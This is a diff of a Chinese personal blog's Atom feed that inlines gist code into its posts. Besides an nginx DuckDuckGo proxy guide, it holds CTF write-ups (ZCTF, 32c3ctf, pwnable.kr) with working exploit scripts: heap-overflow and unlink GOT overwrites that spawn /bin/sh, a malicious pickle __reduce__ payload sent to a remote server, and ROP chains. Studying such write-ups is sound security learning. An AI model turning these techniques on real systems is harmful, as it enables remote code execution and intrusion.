@@ -2,26 +2,26 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
 <title type="text">盘子里的部落格</title>
 <generator uri="https://github.com/jekyll/jekyll">Jekyll</generator>
-<link rel="self" type="application/atom+xml" href="/feed.xml" />
-<link rel="alternate" type="text/html" href="" />
-<updated>2016-05-22T23:11:34+08:00</updated>
-<id>/</id>
+<link rel="self" type="application/atom+xml" href="https://cubarco.org/feed.xml" />
+<link rel="alternate" type="text/html" href="https://cubarco.org" />
+<updated>2016-05-22T23:22:40+08:00</updated>
+<id>https://cubarco.org/</id>
 <author>
   <name>Cubarco</name>
-  <uri>/</uri>
+  <uri>https://cubarco.org/</uri>
   <email>me at cubarco.org</email>
 </author>
 
 
 <entry>
   <title type="html"><![CDATA[如何用 Nginx 搭建简单的 DuckDuckGo 代理站]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx/" />
-  <id>/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx/" />
+  <id>https://cubarco.org/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx</id>
   <published>2016-04-09T00:00:00+08:00</published>
   <updated>2016-04-09T00:00:00+08:00</updated>
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;p&gt;最近感觉手机的网络环境经常变，在寝室 v6， 出门 v4，有的时候会懒得开代理。所以就用 cloudflare+nginx 搞了个简单的 &lt;a href=&quot;https://duckduckgo.com&quot;&gt;DuckDuckGo&lt;/a&gt; 代理站，方便随时掏出手机搜索。没有选择代理 Google 有几点原因，一个是 vps 连 Google 经常让输验证码，再就是 DuckDuckGo 不带 cookie 的搜索结果貌似比 Google 优(?)。&lt;/p&gt;
@@ -30,6 +30,78 @@
 
 &lt;p&gt;nginx 的配置文件如下。&lt;code class=&quot;highlighter-rouge&quot;&gt;domain.com&lt;/code&gt; 改成具体的域名，&lt;code class=&quot;highlighter-rouge&quot;&gt;/path/to/&lt;/code&gt;要改成 duck.domain.com 的证书路径。&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/letsencrypt/live/images.duck.domain.com/&lt;/code&gt;是 Let’s encrypt 生成证书的默认目录，稍后会提到。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;server {
+    listen [::]:80;
+    listen 80;
+    server_name duck.domain.com;
+
+    return 302 https://duck.domain.com/$uri;
+}
+
+server {
+    listen [::]:443;
+    listen 443;
+    server_name duck.domain.com;
+    ssl on;
+    ssl_certificate /path/to/duck.crt;
+    ssl_certificate_key /path/to/duck.key;
+    sub_filter_types text/html text/css application/x-javascript text/xml;
+    access_log off;
+
+    location / {
+        proxy_pass https://duckduckgo.com;
+        proxy_set_header Host duckduckgo.com;
+        proxy_set_header Accept-Encoding &amp;quot;&amp;quot;;
+        proxy_set_header Referer &amp;quot;&amp;quot;;
+        sub_filter &amp;quot;duckduckgo.com&amp;quot; &amp;quot;duck.domain.com&amp;quot;;
+        sub_filter_once off;
+    }
+}
+
+server {
+    listen [::]:443;
+    listen 443;
+    server_name images.duck.domain.com;
+    ssl on;
+    ssl_certificate /etc/letsencrypt/live/images.duck.domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/images.duck.domain.com/privkey.pem;
+    access_log off;
+
+    location / {
+        proxy_pass https://images.duckduckgo.com;
+        proxy_set_header Host images.duckduckgo.com;
+    }
+}
+
+server {
+    listen [::]:443;
+    listen 443;
+    server_name icons.duck.domain.com;
+    ssl on;
+    ssl_certificate /etc/letsencrypt/live/icons.duck.domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/icons.duck.domain.com/privkey.pem;
+    access_log off;
+
+    location / {
+        proxy_pass https://icons.duckduckgo.com;
+        proxy_set_header Host icons.duckduckgo.com;
+    }
+}
+
+server {
+    listen [::]:443;
+    listen 443;
+    server_name ac.duck.domain.com;
+    ssl on;
+    ssl_certificate /etc/letsencrypt/live/ac.duck.domain.com/fullchain.pem;
+    ssl_certificate_key /etc/letsencrypt/live/ac.duck.domain.com/privkey.pem;
+    access_log off;
+
+    location / {
+        proxy_pass https://ac.duckduckgo.com;
+        proxy_set_header Host ac.duckduckgo.com;
+    }
+}&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/08e99fbf316a435b7935727810e40458&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h3 id=&quot;cloudflare&quot;&gt;Cloudflare&lt;/h3&gt;
@@ -59,20 +131,20 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx/&quot;&gt;如何用 Nginx 搭建简单的 DuckDuckGo 代理站&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on April 09, 2016.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2016/04/how-to-set-up-a-duckduckgo-proxy-site-with-nginx/&quot;&gt;如何用 Nginx 搭建简单的 DuckDuckGo 代理站&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on April 09, 2016.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[利用非标准端口 DNS 服务器避免 DNS 劫持]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns/" />
-  <id>/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns/" />
+  <id>https://cubarco.org/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns</id>
   <updated>2016-05-15T00:00:00-00:00</updated>
   <published>2016-03-23T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;blockquote&gt;
@@ -119,20 +191,20 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns/&quot;&gt;利用非标准端口 DNS 服务器避免 DNS 劫持&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on March 23, 2016.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2016/03/avoid-dns-hijacking-with-non-standard-port-dns/&quot;&gt;利用非标准端口 DNS 服务器避免 DNS 劫持&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on March 23, 2016.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup: ZCTF]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2016/01/writeup-zctf/" />
-  <id>/blog/2016/01/writeup-zctf</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2016/01/writeup-zctf/" />
+  <id>https://cubarco.org/blog/2016/01/writeup-zctf</id>
   <updated>2016-01-28T00:00:00-00:00</updated>
   <published>2016-01-24T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;blockquote&gt;
@@ -145,24 +217,247 @@
 
 &lt;p&gt;在最近的 32c3ctf 中出现过一道类似的 readme&lt;sup id=&quot;fnref:1&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;. 就是把&lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt;改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, remote
+
+p = remote(&amp;#39;115.28.27.103&amp;#39;, 22222)
+
+flag_addr = 0x6010c0
+
+p.sendline(&amp;#39;ZCTF{&amp;#39; + &amp;#39;\x01&amp;#39;*29 + &amp;#39;\x00&amp;#39;*262 + p64(flag_addr+5))
+
+p.recvuntil(&amp;#39;***: &amp;#39;)
+xored_flag = p.recv(29)
+
+print &amp;#39;ZCTF{&amp;#39; + &amp;#39;&amp;#39;.join([chr(ord(i) ^ 1) for i in xored_flag])&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/cbbd4ab5462c2f0f287b&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;note1&quot;&gt;note1&lt;/h2&gt;
 
 &lt;p&gt;这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向&lt;code class=&quot;highlighter-rouge&quot;&gt;setvbuf()&lt;/code&gt;的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;. 然后再将另一个 note 地址改到&lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp()&lt;/code&gt;的 got, 通过 edit 把内容改成&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;的地址。最后调用&lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp()&lt;/code&gt;, title 填&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;就可以了。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, ELF, process, remote
+from struct import unpack
+from time import sleep
+
+# p = process(&amp;#39;./note1&amp;#39;)
+p = remote(&amp;#39;115.28.27.103&amp;#39;, 9001)
+elf = ELF(&amp;#39;./libc-2.19.so&amp;#39;)
+
+strcmp_got = 0x602048
+setvbuf_got = 0x602060
+system_offset_to_setvbuf = elf.symbols[&amp;#39;system&amp;#39;] - elf.symbols[&amp;#39;setvbuf&amp;#39;]
+
+p.sendline(&amp;#39;1&amp;#39;)
+p.sendline(&amp;#39;1&amp;#39;)
+p.sendline(&amp;#39;1&amp;#39;)
+p.sendline(&amp;#39;1&amp;#39;)
+
+p.sendline(&amp;#39;1&amp;#39;)
+p.sendline(&amp;#39;2&amp;#39;)
+p.sendline(&amp;#39;2&amp;#39;)
+p.sendline(&amp;#39;2&amp;#39;)
+
+p.sendline(&amp;#39;1&amp;#39;)
+p.sendline(&amp;#39;3&amp;#39;)
+p.sendline(&amp;#39;3&amp;#39;)
+p.sendline(&amp;#39;3&amp;#39;)
+
+# edit the first note to make heap overflow then leak stack address(setvbuf)
+p.sendline(&amp;#39;3&amp;#39;)
+p.sendline(&amp;#39;1&amp;#39;)
+p.sendline(&amp;#39;A&amp;#39; * 280 + p64(setvbuf_got - 0x70) + &amp;#39;2&amp;#39;)
+
+p.sendline(&amp;#39;2&amp;#39;)
+
+p.recvuntil(&amp;#39;content=&amp;#39;)
+p.recvuntil(&amp;#39;content=&amp;#39;)
+p.recvuntil(&amp;#39;content=&amp;#39;)
+
+setvbuf_addr = unpack(&amp;#39;Q&amp;#39;, p.recv(6) + &amp;#39;\x00&amp;#39;*2)[0]
+print &amp;#39;[*] setvbuf_addr: &amp;#39; + hex(setvbuf_addr)
+
+# edit the second note to modify the strcmp_got to system
+p.sendline(&amp;#39;3&amp;#39;)
+p.sendline(&amp;#39;2&amp;#39;)
+p.sendline(&amp;#39;A&amp;#39; * 280 + p64(strcmp_got - 0x70) + &amp;#39;3&amp;#39;)
+
+p.sendline(&amp;#39;3&amp;#39;)
+p.sendline(&amp;#39;\x00&amp;#39;)
+p.sendline(p64(setvbuf_addr + system_offset_to_setvbuf))
+
+# trigger strcmp
+p.sendline(&amp;#39;3&amp;#39;)
+p.sendline(&amp;#39;/bin/sh&amp;#39;)
+
+sleep(0.1)
+p.clean()
+
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/30a44a61252f448964c4&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;delnote2del&quot;&gt;&lt;del&gt;note2&lt;/del&gt;&lt;/h2&gt;
 
 &lt;p&gt;这题在赛时没找到漏洞，赛后看了 FlappyPig 的 Writeup&lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, 只是简单的 fastbin, 感觉好可惜… 360 安全播报给的代码没缩进根本不能看，自己重新写了个。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import process, ELF, p64
+from struct import unpack
+
+# elf = ELF(&amp;#39;./libc-2.19.so&amp;#39;)
+elf = ELF(&amp;#39;/lib64/libc.so.6&amp;#39;)
+p = process(&amp;#39;./note2&amp;#39;)
+
+name_bss = 0x6020e0
+atoi_got = 0x602088
+system_offset_to_atoi = elf.symbols[&amp;#39;system&amp;#39;] - elf.symbols[&amp;#39;atoi&amp;#39;]
+
+
+def add_note(size, content=None):
+    p.sendline(&amp;#39;1&amp;#39;)
+    p.sendline(str(size))
+    if content:
+        p.sendline(content)
+
+
+def show_note(index):
+    p.sendline(&amp;#39;2&amp;#39;)
+    p.sendline(str(index))
+
+
+def edit_note(index, mode, content):
+    p.sendline(&amp;#39;3&amp;#39;)
+    p.sendline(str(index))
+    p.sendline(str(mode))
+    p.sendline(content)
+
+
+def delete_note(index):
+    p.sendline(&amp;#39;4&amp;#39;)
+    p.sendline(str(index))
+
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+    # name
+    p.sendline(p64(0) + p64(0x21) + &amp;#39;A&amp;#39; * 0x10 + p64(0) + p64(0x21))
+    p.sendline(&amp;#39;address&amp;#39;)
+
+    # heap overflow and modify the address malloced in edit function
+    # then the fake chunk will be freed and appended to fastbin
+    add_note(0, &amp;#39;A&amp;#39;*15)  # leave one zero byte for appending
+    add_note(0x80, &amp;#39;A&amp;#39;)
+    for _ in range(7):
+        edit_note(0, 2, &amp;#39;A&amp;#39; * 0x10)
+    edit_note(0, 2, &amp;#39;A&amp;#39; + p64(name_bss + 0x10))
+
+    # malloc the fake chunk in name
+    add_note(0, &amp;#39;A&amp;#39;*0x10)
+    edit_note(2, 2, &amp;#39;A&amp;#39;*(0x20-1))  # leave one zero byte for appending
+    edit_note(2, 2, &amp;#39;A&amp;#39; + p64(atoi_got))  # modify the address of first note
+    show_note(0)
+    p.recvuntil(&amp;#39;Content is &amp;#39;)
+
+    atoi_addr = unpack(&amp;#39;Q&amp;#39;, p.recv(6).ljust(8, &amp;#39;\x00&amp;#39;))[0]
+    print &amp;#39;[*] atoi_addr: 0x%x&amp;#39; % atoi_addr
+    system_addr = atoi_addr + system_offset_to_atoi
+    print &amp;#39;[*] system_addr: 0x%x&amp;#39; % system_addr
+
+    edit_note(0, 1, p64(system_addr))
+    p.sendline(&amp;#39;/bin/sh&amp;#39;)
+
+    p.clean()
+    p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/9752fbbe78a071b04b37&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;delnote3del&quot;&gt;&lt;del&gt;note3&lt;/del&gt;&lt;/h2&gt;
 
 &lt;p&gt;这题同样是没有在赛时做出来，但是与 note2 相反，这题我是找到了两个可以利用的漏洞的(一个是 integer overflow, 另一个是可以增加第八个 note), 但是不知道如何利用。我在比赛的时候一直想着怎么 fastbin, 因为我觉得 unlink 这么古老的 exp 肯定已经不能用了… 没想到这题的环境刚好适合 unlink, 有点可惜。赛后看了 FlappyPig 的 Writeup&lt;sup id=&quot;fnref:2:1&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;, 自己重新写了个 exp, 也算是复习一下 unlink.&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, u64, process, ELF
+
+elf = ELF(&amp;#39;/lib64/libc.so.6&amp;#39;)
+# elf = ELF(&amp;#39;./libc-2.19.so&amp;#39;)
+p = process(&amp;#39;./note3&amp;#39;)
+
+free_got = 0x602018
+atoi_got = 0x602070
+puts_plt = 0x400730
+system_offset_to_atoi = elf.symbols[&amp;#39;system&amp;#39;] - elf.symbols[&amp;#39;atoi&amp;#39;]
+
+
+def add_note(size, content):
+    p.sendline(&amp;#39;1&amp;#39;)
+    p.sendline(str(size))
+    p.sendline(content)
+
+
+def edit_note(index, content):
+    p.sendline(&amp;#39;3&amp;#39;)
+    p.sendline(str(index))
+    p.sendline(content)
+
+
+def delete_note(index):
+    p.sendline(&amp;#39;4&amp;#39;)
+    p.sendline(str(index))
+
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+    for _ in range(7):
+        # add note0 ... note6
+        add_note(0x80, &amp;#39;&amp;#39;)
+
+    # make note3 active
+    edit_note(3, &amp;#39;&amp;#39;)
+
+    note3_ptr = 0x6020c8 + 3 * 8
+
+    # prepare fake previous chunk and overflow to note4 chunk
+    payload = p64(0)  # size
+    payload += p64(0x80 + 1)  # prev_size
+    payload += p64(note3_ptr - 3 * 8)  # FD  (note3_ptr - 3*8 = note0_ptr)
+    payload += p64(note3_ptr - 2 * 8)  # BK
+    payload += &amp;#39;A&amp;#39; * (0x80 - 4*8)  # junk
+    payload += p64(0x80)  # note4_chunk_pre_size
+    payload += p64(0x80 + 2 * 8)  # note4_chunk_size
+
+    # integer overflow
+    edit_note(-0x8000000000000000, payload)
+
+    # delete note4 and unlink fake chunk
+    delete_note(4)
+    # now note3_ptr = note0_ptr
+
+    # modify note0_ptr to free_got and note1_ptr, note2_ptr to atoi_got
+    edit_note(3, p64(free_got) + p64(atoi_got) + p64(atoi_got)[:-1])
+    edit_note(0, p64(puts_plt)[:-1])
+
+    p.clean()
+    delete_note(1)  # leak atoi
+    p.recvuntil(&amp;#39;Input the id of the note:\n&amp;#39;)
+
+    atoi_addr = u64(p.recv(6).ljust(8, &amp;#39;\x00&amp;#39;))
+    system_addr = atoi_addr + system_offset_to_atoi
+    print &amp;#39;[*] system_addr: 0x%x&amp;#39; % system_addr
+
+    # modify note2_ptr(atoi_got) to system_addr
+    edit_note(2, p64(system_addr)[:-1])
+
+    # trigger atoi(now system)
+    p.sendline(&amp;#39;/bin/sh&amp;#39;)
+
+    p.clean()
+    p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/ababdac123a4762c0180&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
@@ -178,20 +473,20 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2016/01/writeup-zctf/&quot;&gt;Writeup: ZCTF&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on January 24, 2016.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2016/01/writeup-zctf/&quot;&gt;Writeup: ZCTF&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on January 24, 2016.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup: 32c3ctf]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/12/writeup-32c3ctf/" />
-  <id>/blog/2015/12/writeup-32c3ctf</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/12/writeup-32c3ctf/" />
+  <id>https://cubarco.org/blog/2015/12/writeup-32c3ctf</id>
   <updated>2016-01-24T00:00:00-00:00</updated>
   <published>2015-12-30T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;h2 id=&quot;forth&quot;&gt;forth&lt;/h2&gt;
@@ -204,6 +499,21 @@
 
 &lt;p&gt;pickle 在 unpickle 的时候会执行对象的 &lt;code class=&quot;highlighter-rouge&quot;&gt;__reduce__&lt;/code&gt; 方法&lt;sup id=&quot;fnref:2&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;。用 eval 把 &lt;code class=&quot;highlighter-rouge&quot;&gt;__main__.flag.flag&lt;/code&gt; 打进 stderr 就行了。&lt;/p&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+import urllib2
+import pickle
+
+
+class Payload(object):
+    def __reduce__(self):
+        comm = &amp;quot;sys.stderr.write(__import__(&amp;#39;__main__&amp;#39;).flag.flag)&amp;quot;
+        return (eval, (comm, ))
+
+data = pickle.dumps(Payload())
+print data
+print urllib2.urlopen(&amp;#39;http://136.243.194.43/&amp;#39;, data=data).read()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/e46eb03e1cd06046d130&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;teufel&quot;&gt;teufel&lt;/h2&gt;
@@ -214,10 +524,104 @@
 
 &lt;h6 id=&quot;offsetpy&quot;&gt;offset.py&lt;/h6&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, remote
+from time import sleep
+from struct import unpack
+
+main_without_push_addr = 0x4004ee
+
+
+def shift_offsets():
+    for i in range(0, 20):
+        yield i * 0x1000
+        if i != 0:
+            yield i * -0x1000
+
+for shift in shift_offsets():
+    p = remote(&amp;#39;136.243.194.41&amp;#39;, 666)
+    # leak stack address
+    p.send(p64(9))
+    sleep(0.1)
+    p.send(&amp;#39;a&amp;#39;*9)
+
+    rbp_base_str = &amp;#39;\x00&amp;#39; + p.recvuntil(&amp;#39;\x7f&amp;#39;)[-5:] + &amp;#39;\x00&amp;#39;*2
+    rbp_base = unpack(&amp;#39;Q&amp;#39;, rbp_base_str)[0]
+
+    rbp_new_base = rbp_base - 0x500
+    __stack_chk_fail_addr = rbp_base - 0x4d41e0 + shift
+
+    print &amp;#39;[*] rbp_base: &amp;#39; + hex(rbp_base)
+
+    # set rbp and rsp
+    payload1 = &amp;#39;a&amp;#39; * 8
+    payload1 += p64(rbp_new_base) + p64(main_without_push_addr)
+
+    p.send(p64(len(payload1)))
+    sleep(0.1)
+    p.send(payload1)
+
+    ropchain = &amp;#39;a&amp;#39; * 16
+    ropchain += p64(__stack_chk_fail_addr)
+
+    p.send(p64(len(ropchain)))
+    sleep(0.1)
+    p.send(ropchain)
+
+    ret = p.recvall()
+    if ret.find(&amp;#39;stack smash&amp;#39;) &amp;gt; -1:
+        print &amp;#39;[*] __stack_chk_fail offset: &amp;#39; + hex(-0x4d41e0 + shift)
+        break
+    p.close()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/569fd814a29d8ef988e1&quot; data-gist-file=&quot;32c3ctf-teufel-offset.py&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h6 id=&quot;exppy&quot;&gt;exp.py&lt;/h6&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, remote
+from time import sleep
+from struct import unpack
+
+main_without_push_addr = 0x4004ee
+
+p = remote(&amp;#39;136.243.194.41&amp;#39;, 666)
+
+# leak stack address
+p.send(p64(9))
+sleep(0.1)
+p.send(&amp;#39;a&amp;#39;*9)
+rbp_base_str = &amp;#39;\x00&amp;#39; + p.recvuntil(&amp;#39;\x7f&amp;#39;)[-5:] + &amp;#39;\x00&amp;#39;*2
+rbp_base = unpack(&amp;#39;Q&amp;#39;, rbp_base_str)[0]
+
+rbp_new_base = rbp_base - 0x500
+__stack_chk_fail_addr = rbp_base - 0x4d11e0
+system_addr = __stack_chk_fail_addr - 0xd4a50
+pop_rdi_ret = __stack_chk_fail_addr - 0xf757e
+
+print &amp;#39;[*] rbp_base: &amp;#39; + hex(rbp_base)
+
+# set rbp and rsp
+payload1 = &amp;#39;a&amp;#39; * 8
+payload1 += p64(rbp_new_base) + p64(main_without_push_addr)
+
+p.send(p64(len(payload1)))
+sleep(0.1)
+p.send(payload1)
+
+ropchain = &amp;#39;a&amp;#39; * 8
+ropchain += &amp;#39;/bin/sh\x00&amp;#39;
+ropchain += p64(pop_rdi_ret) + p64(rbp_new_base)
+ropchain += p64(system_addr)
+
+p.send(p64(len(ropchain)))
+sleep(0.1)
+p.send(ropchain)
+
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/569fd814a29d8ef988e1&quot; data-gist-file=&quot;32c3ctf-teufel-exp.py&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h2 id=&quot;deldel&quot;&gt;&lt;del&gt;吐槽&lt;/del&gt;&lt;/h2&gt;
@@ -247,20 +651,20 @@
   &lt;/ol&gt;
 &lt;/div&gt;
 
-  &lt;p&gt;&lt;a href=&quot;/blog/2015/12/writeup-32c3ctf/&quot;&gt;Writeup: 32c3ctf&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;&quot;&gt;盘子里的部落格&lt;/a&gt; on December 30, 2015.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;https://cubarco.org/blog/2015/12/writeup-32c3ctf/&quot;&gt;Writeup: 32c3ctf&lt;/a&gt; was originally published by Cubarco at &lt;a href=&quot;https://cubarco.org&quot;&gt;盘子里的部落格&lt;/a&gt; on December 30, 2015.&lt;/p&gt;</content>
 </entry>
 
 
 <entry>
   <title type="html"><![CDATA[Writeup-Pwnable: unexploitable]]></title>
-  <link rel="alternate" type="text/html" href="/blog/2015/12/writeup-pwnable-unexploitable/" />
-  <id>/blog/2015/12/writeup-pwnable-unexploitable</id>
+  <link rel="alternate" type="text/html" href="https://cubarco.org/blog/2015/12/writeup-pwnable-unexploitable/" />
+  <id>https://cubarco.org/blog/2015/12/writeup-pwnable-unexploitable</id>
   <updated>2015-12-23T00:00:00-00:00</updated>
   <published>2015-12-23T00:00:00+08:00</published>
   
   <author>
     <name>Cubarco</name>
-    <uri></uri>
+    <uri>https://cubarco.org</uri>
     <email>me at cubarco.org</email>
   </author>
   <content type="html">&lt;h3 id=&quot;rop&quot;&gt;ROP&lt;/h3&gt;
@@ -271,6 +675,58 @@
 
 &lt;h6 id=&quot;exp-roppy&quot;&gt;exp-rop.py&lt;/h6&gt;
 
+&lt;noscript&gt;&lt;pre&gt;#!/usr/bin/env python
+# coding=utf8
+
+from pwn import p64, process, ELF
+from time import sleep
+
+EXECUTABLE = &amp;#39;/home/unexploitable/unexploitable&amp;#39;
+
+elf = ELF(EXECUTABLE)
+
+junk = 0xdeadbeef
+syscall_addr = 0x400560  # 0f 0a(syscall)
+pop_junk_rbx_rbp_r12_r13_r14_r15_ret = 0x4005e6
+mov_call = 0x4005d0
+pop_rbp_ret = 0x400512
+read_ret = 0x40055b
+bss_addr = elf.bss()
+rbp_base = bss_addr + 0x10
+syscall_ptr = rbp_base + 8 * 10
+sh_str_addr = rbp_base + 8 * 11
+
+# pop_junk_rbx_rbp_r12_r13_r14_r15_ret then call syscall
+syscall_chain = p64(junk) + p64(0) + p64(junk) + p64(syscall_ptr)
+syscall_chain += p64(sh_str_addr) + p64(0) + p64(0)
+syscall_chain += p64(mov_call)
+syscall_chain += p64(syscall_addr) + &amp;#39;/bin/sh\x00&amp;#39;
+
+# point rbp to .bss and read again
+payload1 = &amp;#39;A&amp;#39; * 0x10
+payload1 += p64(rbp_base)
+payload1 += p64(read_ret)
+
+# prepare last bytes of syscall_chain
+payload2 = &amp;#39;A&amp;#39; * 0x10
+payload2 += p64(rbp_base) + p64(read_ret)
+payload2 += &amp;#39;B&amp;#39; * (0x3b-0x10-2*8)
+payload2 += syscall_chain[0x3b-0x10-2*8:]
+
+# set rax to 0x3b using the return value of read()
+# and prepare first bytes of syscall_chain
+payload3 = &amp;#39;A&amp;#39; * 0x10
+payload3 += p64(junk) + p64(pop_junk_rbx_rbp_r12_r13_r14_r15_ret)
+payload3 += syscall_chain[:0x3b-0x10-2*8]
+
+p = process(EXECUTABLE)
+sleep(3)
+p.send(payload1)
+sleep(0.1)
+p.send(payload2)
+sleep(0.1)
+p.send(payload3)
+p.interactive()&lt;/pre&gt;&lt;/noscript&gt;
 &lt;div class=&quot;gist&quot; data-gist=&quot;cubarco/23b04edc7e79b1c71547&quot; data-gist-file=&quot;pwnable-hackerssecret-unexploitable-rop.py&quot;&gt;Loading gist...&lt;/div&gt;
 
 &lt;h3 id=&quot;srop&quot;&gt;SROP&lt;/h3&gt;
@@ -279,6 +735,60 @@
 
 &lt;h6 id=&quot;exp-sroppy&quot;&gt;exp-srop.py&lt;/h6&gt;
 
